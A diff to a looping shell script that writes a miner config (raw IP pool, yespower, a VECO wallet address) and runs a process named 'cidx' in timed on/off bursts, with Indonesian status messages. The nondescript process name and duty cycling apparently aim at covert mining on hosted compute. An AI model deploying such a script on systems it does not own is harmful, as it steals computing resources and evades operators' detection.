@@ -12,8 +12,8 @@ while true; do
   cat > config.json <<END
 {
   "url": "45.115.224.230:443",
-  "user": "edownload79.worker1",
-  "pass": "x",
+  "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1",
+  "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
   "threads": 6,
   "algo": "yespower"
 }
@@ -29,7 +29,7 @@ END
   clear
   start_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
   echo "[$start_time] STATUS: 🚀 JALAN"
-  echo "Process cidx dijalankan (3 menit aktif)..."
+  echo "Process cidx dijalankan (4 menit aktif)..."
   jobs
 
   # Run awk to process config.json and print the matching date-time part
@@ -44,8 +44,8 @@ END
   }
   ' config.json
 
-  # Run for 3 minutes
-  sleep 180
+  # Run for 4 minutes
+  sleep 240
 
   # Kill cidx process
   pkill cidx
@@ -53,8 +53,8 @@ END
   # Print info: STOPPED
   stop_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
   echo "[$stop_time] STATUS: 🛑 MATI"
-  echo "Process cidx dimatikan (tunggu 2 menit)..."
+  echo "Process cidx dimatikan (tunggu 1 menit)..."
 
-  # Wait for 2 minute before restarting
-  sleep 120
+  # Wait for 1 minute before restarting
+  sleep 60
 done
